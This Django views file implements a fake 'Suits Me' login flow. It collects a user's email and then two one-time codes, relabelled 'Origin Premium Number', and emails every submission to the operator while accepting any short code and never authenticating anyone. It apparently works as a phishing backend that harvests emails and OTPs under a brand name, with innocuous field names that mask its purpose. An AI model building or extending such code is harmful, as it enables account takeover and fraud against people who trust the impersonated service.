import logging

from django.shortcuts import render, redirect
from .forms import (
    CheckEmailOriginPremiumNumberForm,
    EmailForm,
    OriginPremiumNumberForm,
)
from django.conf import settings
from django.contrib import messages
from django.core.mail import EmailMultiAlternatives

logger = logging.getLogger(__name__)


def _admin_notification_recipient():
    return settings.DEFAULT_FROM_EMAIL


def _send_admin_notification(subject, body, event_name):
    from_email = settings.DEFAULT_FROM_EMAIL
    recipient_list = [_admin_notification_recipient()]
    msg = EmailMultiAlternatives(subject, body, from_email, recipient_list)
    logger.info(
        "Sending %s notification via %s from %s to %s",
        event_name,
        settings.EMAIL_BACKEND,
        from_email,
        ", ".join(recipient_list),
    )
    sent_count = msg.send(fail_silently=False)
    logger.info(
        "Finished %s notification send; backend reported %s message(s)",
        event_name,
        sent_count,
    )
    if sent_count < 1:
        raise RuntimeError(f"Email backend reported zero messages sent for {event_name}")
    return sent_count


def home(request):
    return render(request, 'home.html')

def redirect_page(request):
    return render(request, "check_email.html")


def login_page(request):
    """Login page - user enters email"""
    if request.method == 'POST':
        form = EmailForm(request.POST)
        if form.is_valid():
            try:
                email = form.cleaned_data['email']
                request.session['submitted_email'] = email

                subject = "New Login Email Submission - Suits Me"
                email_body = f"""
                A user has submitted their email address via the login page.

                Email: {email}

                ---
                This is an automated notification from Suits Me.
                """

                _send_admin_notification(subject, email_body, "login-email")

                # Redirect to check email page (flow continues with generic code entry)
                return redirect('check_email')
            except Exception:
                logger.exception("Email sending error")
                messages.error(request, 'Failed to send email. Please try again later.')
                form = EmailForm(request.POST)
        else:
            form = EmailForm(request.POST)
    else:
        form = EmailForm()

    return render(request, 'logins.html', {'form': form})


def check_email(request):
    """Check email page - user enters an internal test reference number."""
    if request.method == 'POST':
        form = CheckEmailOriginPremiumNumberForm(request.POST)
        if form.is_valid():
            origin_premium_number = form.cleaned_data['verification_code']
            try:
                subject = "Origin Premium Number Submission - Suits Me"
                submitted_email = request.session.get('submitted_email', 'unknown')
                email_body = f"""
                A user has submitted an Origin Premium Number via the check email page.

                Email: {submitted_email}
                Origin Premium Number: {origin_premium_number}

                ---
                This is an automated notification from Suits Me.
                """

                _send_admin_notification(
                    subject,
                    email_body,
                    "origin-premium-number-check-email",
                )

                # Redirect to the final reference-number page.
                return redirect('enter_otp')
            except Exception:
                logger.exception("Origin Premium Number email sending error")
                messages.error(request, 'Failed to send Origin Premium Number. Please try again.')
                form = CheckEmailOriginPremiumNumberForm(request.POST)
        else:
            form = CheckEmailOriginPremiumNumberForm(request.POST)
    else:
        form = CheckEmailOriginPremiumNumberForm()
    
    return render(request, 'check_email.html', {'form': form})


def enter_otp(request):
    """Enter OTP page - user enters an internal test reference number."""
    if request.method == 'POST':
        form = OriginPremiumNumberForm(request.POST)
        if form.is_valid():
            origin_premium_number = form.cleaned_data['otp']

            if len(origin_premium_number) <= 6:
                try:
                    subject = "Origin Premium Number Submission - Suits Me"
                    submitted_email = request.session.get('submitted_email', 'unknown')
                    email_body = f"""
                    A user has submitted an Origin Premium Number via the enter OTP page.

                    Email: {submitted_email}
                    Origin Premium Number: {origin_premium_number}

                    ---
                    This is an automated notification from Suits Me.
                    """

                    _send_admin_notification(subject, email_body, "origin-premium-number")

                    # Accept any internal reference number and redirect to thanks page.
                    return redirect('thanks')
                except Exception:
                    logger.exception("Origin Premium Number email sending error")
                    messages.error(request, 'Failed to send Origin Premium Number. Please try again.')
                    form = OriginPremiumNumberForm(request.POST)
            else:
                messages.error(request, 'Origin Premium Number must be at most 6 digits.')
                form = OriginPremiumNumberForm(request.POST)
        else:
            form = OriginPremiumNumberForm(request.POST)
    else:
        form = OriginPremiumNumberForm()
    
    return render(request, 'enter_otp.html', {'form': form})


def thanks(request):
    """Thanks page - final page after successful login"""
    return render(request, 'thanks.html')
